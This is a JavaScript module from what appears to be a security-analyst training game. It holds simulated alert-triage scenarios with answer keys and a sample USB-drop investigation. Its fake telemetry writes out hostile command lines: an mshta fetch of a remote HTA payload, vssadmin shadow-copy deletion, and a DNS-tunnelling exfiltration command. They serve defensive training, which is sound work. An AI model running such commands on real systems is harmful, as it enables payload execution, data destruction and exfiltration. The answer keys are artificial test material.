import { CAMPAIGN_MISSIONS } from './campaignMissions.js';

/**
 * Deterministic Daily Challenge selector based on UTC date string (YYYY-MM-DD).
 */
export function getDailyChallengeInfo(dateString) {
  const todayStr =
    typeof dateString === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(dateString)
      ? dateString
      : new Date().toISOString().slice(0, 10);

  let hash = 0;
  for (let i = 0; i < todayStr.length; i++) {
    hash = (hash * 31 + todayStr.charCodeAt(i)) >>> 0;
  }

  const index = hash % CAMPAIGN_MISSIONS.length;
  const mission = CAMPAIGN_MISSIONS[index];

  const modifiers = [
    'Strict Evidence Discipline: Avoid collecting any unrelated noise events.',
    'Zero-Hint Precision: Complete the investigation without revealing any hints.',
    'Rapid Containment Focus: Verify at least 2 core evidence records before executing containment.',
    'Full ATT&CK Attribution: Identify all ground-truth MITRE ATT&CK techniques in your report.'
  ];

  return {
    date: todayStr,
    missionId: mission.id,
    missionTitle: mission.title,
    difficulty: mission.difficulty,
    modifier: modifiers[hash % modifiers.length],
    bonusXp: 75
  };
}

/**
 * Deterministic seeded Endless Triage scenarios for rapid alert classification practice.
 */
export const ENDLESS_TRIAGE_POOL = [
  {
    id: 'TRIAGE-01',
    title: 'VPN Login From Approved Travel Subnet Followed by Git Pull',
    severity: 'low',
    source: 'iam_auth',
    host: 'WKSTN-DEV-08',
    username: 's.verma',
    sourceIp: '192.0.2.88',
    commandLine: 'git.exe pull origin main',
    summary:
      'Developer s.verma authenticated via hardware FIDO2 token from conference Wi-Fi (192.0.2.88, pre-registered travel ticket TRV-410) and pulled an internal repository.',
    expectedClassification: 'benign_activity',
    explanation:
      'Hardware FIDO2 MFA succeeded, travel ticket TRV-410 is on file, and post-login activity is routine developer Git usage.'
  },
  {
    id: 'TRIAGE-02',
    title: 'Excel Spawning mshta.exe With External URL',
    severity: 'critical',
    source: 'edr_sensor',
    host: 'WKSTN-ACC-03',
    username: 'p.rossi',
    sourceIp: '10.20.19.12',
    destinationIp: '203.0.113.74',
    commandLine: 'mshta.exe http://203.0.113.74/stage2.hta',
    summary:
      'Process excel.exe spawned mshta.exe fetching an external HTML Application payload from 203.0.113.74.',
    expectedClassification: 'malicious_incident',
    explanation:
      'Office applications spawning mshta.exe to retrieve remote HTA content is a high-confidence proxy execution technique (T1218.005).'
  },
  {
    id: 'TRIAGE-03',
    title: 'Nightly SCCM Client Executing Signed Health Check Script',
    severity: 'low',
    source: 'edr_sensor',
    host: 'WKSTN-HR-09',
    username: 'SYSTEM',
    sourceIp: '10.20.14.59',
    commandLine: 'powershell.exe -NoLogo -ExecutionPolicy Signed -File C:\\Windows\\CCM\\HealthCheck.ps1',
    summary:
      'CcmExec.exe under SYSTEM executed a digitally signed health check script at 03:00 UTC.',
    expectedClassification: 'benign_activity',
    explanation:
      'Spawned by verified parent CcmExec.exe under SYSTEM with a valid corporate signature during the standard maintenance window.'
  },
  {
    id: 'TRIAGE-04',
    title: 'Single Failed SSH Login Followed by No Further Activity',
    severity: 'low',
    source: 'iam_auth',
    host: 'SRV-BUILD-01',
    username: 'admin_deploy',
    sourceIp: '198.51.100.201',
    commandLine: null,
    summary:
      'One failed SSH public-key authentication attempt from 198.51.100.201 with zero subsequent connections and no session established.',
    expectedClassification: 'inconclusive',
    explanation:
      'A single isolated failed probe without follow-on attempts or compromise is opportunistic background noise/inconclusive probing rather than an active breach.'
  },
  {
    id: 'TRIAGE-05',
    title: 'Domain Controller Shadow Copy Deletion via vssadmin',
    severity: 'critical',
    source: 'edr_sensor',
    host: 'DC-CORP-01',
    username: 'j.kovacs',
    sourceIp: '10.20.1.10',
    commandLine: 'vssadmin.exe delete shadows /all /quiet',
    summary:
      'Interactive session on DC-CORP-01 executed vssadmin.exe to delete all Volume Shadow Copies silently.',
    expectedClassification: 'malicious_incident',
    explanation:
      'Deleting Volume Shadow Copies via `vssadmin delete shadows /all /quiet` is a classic ransomware/wiper inhibit-system-recovery action (T1490).'
  },
  {
    id: 'TRIAGE-06',
    title: 'DNS TXT Tunneling Burst to Uncategorized Subdomain',
    severity: 'high',
    source: 'dns_resolver',
    host: 'WKSTN-RND-04',
    username: 'c.hale',
    sourceIp: '10.20.31.40',
    destinationIp: '203.0.113.119',
    commandLine: 'dns_sync.exe --chunk-hex 4a6f686e.exfil-tun.example.net',
    summary:
      'Over 180 high-entropy hexadecimal subdomain TXT queries sent to *.exfil-tun.example.net within 60 seconds by unsigned binary dns_sync.exe.',
    expectedClassification: 'malicious_incident',
    explanation:
      'High-frequency hex-encoded subdomain TXT queries from an unsigned binary indicate DNS tunneling C2/exfiltration (T1071.004).'
  }
];

export function getEndlessTriageSequence(seed = 42) {
  let state = Number(seed) || 42;
  const copy = [...ENDLESS_TRIAGE_POOL];
  for (let i = copy.length - 1; i > 0; i--) {
    state = (state * 1664525 + 1013904223) >>> 0;
    const j = state % (i + 1);
    const tmp = copy[i];
    copy[i] = copy[j];
    copy[j] = tmp;
  }
  return copy;
}

export const SAMPLE_CUSTOM_SCENARIO = {
  id: 'custom-usb-drop-scenario',
  title: 'Custom Scenario: The Conference USB Drop',
  subtitle: 'Removable Media Execution & Outbound Callback',
  difficulty: 'Custom',
  estimatedMinutes: 10,
  xpReward: 250,
  minimumEvidenceRequired: 2,
  organization: 'Custom Lab Corp (Simulated)',
  environment: 'R&D Lab Workstation Subnet',
  briefing: {
    summary:
      'An engineer plugged in an unlabeled USB drive found at a conference on WKSTN-LAB-12. Determine whether malicious execution occurred.',
    initialAlert: {
      alertId: 'ALT-CUST-01',
      title: 'Suspicious Execution From Removable Media Path (E:\\)',
      severity: 'high',
      triggeredAt: '2026-10-21T09:10:15Z',
      entity: 'WKSTN-LAB-12'
    },
    knownFacts: ['Workstation WKSTN-LAB-12 mounted removable drive E:\\ at 09:09 UTC.'],
    unknowns: ['Did any executable run from E:\\ and initiate network traffic?'],
    telemetrySources: ['edr_sensor', 'dns_resolver'],
    timeWindow: '2026-10-21 09:05 UTC – 09:20 UTC',
    consequencesOfPoorDecisions: 'Leaving WKSTN-LAB-12 connected allows lateral movement into the R&D subnet.'
  },
  objectives: [
    {
      id: 'obj-cust-1',
      title: 'Collect evidence of the USB binary execution and DNS lookup',
      type: 'collect_evidence',
      minCount: 2,
      requiredAnyIds: ['EVT-C01', 'EVT-C02'],
      minRequiredMatches: 2
    },
    {
      id: 'obj-cust-2',
      title: 'Isolate WKSTN-LAB-12',
      type: 'execute_response',
      minCount: 1
    },
    {
      id: 'obj-cust-3',
      title: 'Submit Incident Assessment Report',
      type: 'complete_assessment'
    }
  ],
  hints: [
    {
      level: 1,
      text: 'Inspect EVT-C01 and EVT-C02 on WKSTN-LAB-12.'
    }
  ],
  events: [
    {
      eventId: 'EVT-C01',
      timestamp: '2026-10-21T09:10:02Z',
      source: 'edr_sensor',
      eventType: 'process_execution',
      severity: 'high',
      host: 'WKSTN-LAB-12',
      username: 'b.carter',
      processName: 'Keynote_Slides.scr',
      parentProcess: 'explorer.exe',
      commandLine: '"E:\\Keynote_Slides.scr" /s',
      action: 'process_start',
      result: 'success',
      message: 'Unsigned screensaver binary Keynote_Slides.scr executed from removable drive E:\\.',
      tags: ['unsigned_binary', 'removable_media'],
      metadata: { relatedEventIds: ['EVT-C02'] }
    },
    {
      eventId: 'EVT-C02',
      timestamp: '2026-10-21T09:10:15Z',
      source: 'dns_resolver',
      eventType: 'dns_query',
      severity: 'high',
      host: 'WKSTN-LAB-12',
      username: 'b.carter',
      sourceIp: '10.20.50.12',
      destinationIp: '198.51.100.188',
      domain: 'usb-beacon.example.net',
      processName: 'Keynote_Slides.scr',
      action: 'dns_lookup',
      result: 'success',
      message: 'Keynote_Slides.scr resolved external C2 domain usb-beacon.example.net -> 198.51.100.188.',
      tags: ['suspicious_domain', 'c2_beacon'],
      metadata: { relatedEventIds: ['EVT-C01'] }
    }
  ],
  groundTruth: {
    classification: 'malicious_incident',
    severity: 'high',
    affectedEntities: ['WKSTN-LAB-12', 'b.carter', 'usb-beacon.example.net'],
    attackStages: ['T1071.004'],
    expectedEvidenceIds: ['EVT-C01', 'EVT-C02'],
    bonusEvidenceIds: [],
    expectedResponseActions: [
      {
        actionType: 'isolate_host',
        target: 'WKSTN-LAB-12',
        required: true,
        consequence: 'Isolated WKSTN-LAB-12 from R&D network.'
      }
    ],
    explanation:
      'User b.carter executed a masqueraded screensaver executable (`Keynote_Slides.scr`) from removable media `E:\\` (EVT-C01), which immediately resolved `usb-beacon.example.net` (EVT-C02).'
  }
};
